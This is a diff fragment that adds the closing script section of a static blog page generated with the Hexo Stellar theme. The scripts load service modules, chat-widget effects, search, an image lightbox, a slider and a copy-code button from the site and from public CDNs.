+    el.appendChild(script);
+  }
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.7.0/style.min.css" media="all">
+
+
+
+<!-- inject -->
+
+</div></body></html>
